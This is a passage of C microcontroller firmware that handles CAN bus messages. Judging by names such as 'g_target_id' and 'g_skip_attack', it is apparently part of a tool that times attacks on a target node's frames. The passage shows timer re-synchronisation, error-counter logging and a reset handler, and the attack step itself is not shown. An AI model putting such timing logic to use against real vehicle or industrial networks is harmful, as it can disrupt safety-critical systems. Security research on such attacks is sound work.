            if (g_sCAN0RxMessage.ui32MsgID == PRECEDED_ID ) {
                volatile int delay = 0;
                for (delay = 0; delay < 1000; delay++); /* FIXME: Fudge factor. */
                CANMessageClear(CAN0_BASE, TXOBJECT_5);
            }
#endif

            if (g_sCAN0RxMessage.ui32MsgID == g_target_id) {
#if defined(SYNC_0PHASE)
                if (g_sync != 1) {
                    if (g_sync > 3) g_sync--;
                    else if (g_msg_since_idle < g_sync_since_idle) {
                        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
                        g_sync_since_idle = g_msg_since_idle;
                        g_sync = 2;
                    }
                }
#elif defined(SYNC_PERIOD)
                if (g_sync != 1) {
                    if (g_sync > 3) g_sync--;
                    else {
                        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
                        count = 0;
                        g_sync = 2;
                    }
                }
#endif /* SYNC */

#if defined(VERBOSE)
                CANErrCntrGet(CAN0_BASE, &rec, &tec);
                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
#endif

            } else if (g_sCAN0RxMessage.ui32MsgID == 0xff) {
                UARTprintf("%d\tRESET\n", count);
                g_sync = 4;
                g_sync_since_idle = 255;
                g_msg_since_idle = 0;
                g_reset = 0;
                g_target_id = TARGET_ID;
                g_skip_attack = SKIP_ATTACK;
                ResetCAN0();
                TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
                ROM_TimerEnable(TIMER1_BASE, TIMER_A);
            }

            //
            // Print the received character to the UART terminal
            //
//            UARTprintf("%c", g_ui8RXMsgData);

        }
        if (g_ui32ErrFlag) {
            CANErrorHandler();
        }
    }
}
